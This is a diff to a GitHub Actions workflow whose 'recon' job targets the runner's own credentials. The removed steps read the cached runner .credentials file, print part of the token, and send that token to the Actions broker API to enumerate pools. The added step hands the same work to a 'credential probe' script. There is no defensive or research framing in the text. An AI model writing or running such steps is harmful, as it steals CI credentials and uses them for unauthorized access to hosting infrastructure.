@@ -7,22 +7,6 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Read credentials token
-        run: |
-          CREDS=/home/runner/actions-runner/cached/2.336.0/.credentials
-          echo "perms: $(stat -c '%a %U %G' $CREDS)"
-          python3 -c "
-import json
-d = json.load(open('/home/runner/actions-runner/cached/2.336.0/.credentials'))
-t = d.get('Data',{}).get('token','')
-print('scheme:', d.get('Scheme'))
-print('tok_len:', len(t))
-print('tok_prefix:', t[:10])
-" 2>&1
-
-      - name: Probe broker with runner token
-        run: |
-          TOKEN=$(python3 -c "import json; print(json.load(open('/home/runner/actions-runner/cached/2.336.0/.credentials'))['Data']['token'])")
-          echo "token_len=${#TOKEN}"
-          curl -sf --max-time 5 -H "Authorization: Bearer $TOKEN" "https://broker.actions.githubusercontent.com/_apis/health" 2>&1 | head -5 || echo "failed"
-          curl -sf --max-time 5 -H "Authorization: Bearer $TOKEN" -H "Accept: application/json;api-version=7.1" "https://broker.actions.githubusercontent.com/_apis/distributedtask/pools?api-version=7.1" 2>&1 | python3 -m json.tool 2>/dev/null | head -30 || echo "failed"
+      - uses: actions/checkout@v4
+      - name: Run credential probe
+        run: bash probe.sh
